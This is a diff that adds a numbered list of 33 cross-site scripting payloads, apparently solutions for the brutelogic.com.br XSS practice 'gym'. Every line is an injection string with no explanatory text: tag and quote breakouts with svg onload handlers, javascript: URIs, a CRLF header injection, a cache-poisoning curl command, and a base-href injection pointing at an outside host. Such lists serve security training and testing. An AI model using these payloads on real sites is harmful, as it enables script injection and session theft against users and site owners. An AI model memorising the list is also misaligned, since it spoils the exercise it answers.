@@ -1,0 +1,33 @@
+01. </title><svg/onload=alert(1)> 
+02. </noscript><svg/onload=alert(1)>
+03. </style><svg/onload=alert(1)>
+04. %26apos;-alert(1)-%26apos;
+05. <svg onload=alert(1)>
+06. "><svg/onload=alert(1)>
+07. '><svg/onload=alert(1)>
+08. "autofocus/onfocus="alert(1)
+09. 'autofocus/onfocus="alert(1)
+10. </textarea><svg/onload=alert(1)>
+11. </script><svg/onload=alert(1)>
+12. </script><svg/onload=alert(1)>
+13. '-alert(1)-'
+14. "-alert(1)-"
+15. \'-alert(1)//
+16. \"-alert(1)//
+17. </script><svg/onload=alert(1)> 
+18. `-alert(1)-`
+19. \`-alert(1)//
+20. ${alert(1)}
+21. javascript://%250Aalert(1)//?1 (click in KNOXSS glitch)
+22. "onload="alert(1) or "></iframe><svg/onload=alert(1)>
+23. 1%0D%0AContent-Type:text/html%0D%0A<svg/onload=alert(1)>
+24. /alert(1)//\
+25. <svg/onload=alert(1)>
+26. javascript:alert(1)
+27. alert(1)
+28. --><svg/onload=alert(1)>
+29. <!--><svg/onload=alert(1)-->
+30. \74img/src/onerror=alert(1)\76
+31. curl -H 'x:</script><svg/onload=alert(1)>' https://brutelogic.com.br/gym.php?[random-string-here] (same random string 2 times to cache then open URL in browser)
+32. https://brutelogic.com.br/gym.php/"><svg/onload=alert(1)>
+33. ?CSP&p05=<base/href=//X55.is>
